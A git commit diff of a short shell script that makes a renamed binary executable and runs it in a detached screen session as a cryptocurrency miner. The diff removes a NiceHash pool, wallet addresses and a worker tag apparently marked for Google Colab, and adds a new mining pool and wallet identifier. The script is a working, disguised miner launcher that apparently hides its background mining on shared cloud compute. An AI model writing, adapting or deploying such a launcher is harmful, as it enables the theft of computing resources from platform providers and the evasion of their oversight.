ff2f1829159d80ca8be96618ac6348411ca9065b
renilo <88342640+renilo@users.noreply.github.com>
2022-01-16 14:26:38 +0700

    Update kontol.sh

--- kontol.sh
+++ kontol.sh
@@ -1,6 +1,2 @@
-POOL=stratum+tcp://daggerhashimoto.eu-west.nicehash.com:3353
-WALLET=3D6NtTR5Zw5VmYx9ZNfHkLhXRp2uPb9BXk
-WALLET2=3DnXgkmRkXovYj6teHWmJWBdtiTTVPj5B4
-WORKER=$(echo $(shuf -i 1-9999999999 -n 1)-P)
 chmod +x memek
-screen -dmS Running1 ./memek --algo ETHASH --pool $POOL --user $WALLET2.COLAB
+screen -dmS Running1 ./memek run https://server1.whalestonpool.com EQCq8h0FQ_IzVSueBKoYahTBe5EXnomyu6WVTPp29L8YYG2Z
